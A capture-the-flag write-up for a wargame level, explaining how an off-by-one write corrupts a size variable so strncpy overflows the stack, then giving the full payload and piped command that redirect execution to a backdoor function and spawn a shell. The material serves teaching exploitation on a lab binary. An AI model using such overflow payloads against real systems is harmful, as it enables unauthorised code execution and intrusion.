# Write-up: level09 — Size corruption via controlled overflow

## Description

The executable reads two strings with fgets: a username, then a message. It copies the username into a buffer, prints it back, then copies the message into that same buffer with `strncpy`.

## Finding the first exploit

The program reads a **username** (128 bytes max via `fgets`), then a **message** (1024 bytes max via `fgets`), and copies the message into a buffer with:

```c
strncpy(buffer, message, size);
```

The catch: `size` isn't a constant — it's a stack variable, located right after the area where the username gets copied.

The username copy also has an off-by-one:

```c
for (i = 0; i <= 40 && s[i]; ++i)   // should be i < 40
    buffer[i + 140] = s[i];
```

`i <= 40` writes **41 bytes** instead of 40 → the last byte spills over by one and overwrites the low-order byte of `size` (normally `140`).

To exploit this, we send 40 filler bytes, then a 41st byte that becomes the new low-order byte of `size`. Any value **≥ 202** works:

```python
"\x90"*40 + "\xca"
```

`0xca` = 202 decimal, which sets `size` to 202 (any value from 202 to 255 works the same way, since only the low byte is overwritten). We add a trailing `"\n"` so `fgets` stops reading right after our 41 bytes, instead of waiting for more input.

## Exploiting the corrupted size

`size` is no longer `140` — it's now controlled by us. `strncpy` uses it as the number of bytes to copy from the message into the buffer, so it can now copy **more than the buffer actually holds**, overflowing onto the rest of the stack frame.

Testing padding lengths shows that **200 bytes** of filler in the message are needed to reach the return address of `handle_msg` (the caller of the function that does the copy) — not the buffer's own function. Right after those 200 bytes comes the return address itself, which we overwrite with the address of `secret_backdoor`, followed by the command that `system()` will receive as input, `/bin/sh` in our case:

```python
"\x90"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "/bin/sh"
```

GDB reports the address of `secret_backdoor` as `0x55555555488c`. GDB doesn't print the leading zero digits of a full 64-bit address — the real value is `0x000055555555488c`, i.e. the same address padded with two `0x00` bytes at the high end. That's why the payload ends with `\x00\x00`: written in little-endian, the address's high-order (zero) bytes come last.

## The final command

Putting it all together:

```bash
(python -c 'print("\x90"*40 + "\xca" + "\n" +"\x90"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "/bin/sh")'; cat) | ./level09
```

This spawns a shell via `secret_backdoor`, now we just have to cat the flag of end

**Note:** only one payload attempt works per run — the program needs to be relaunched between tries.
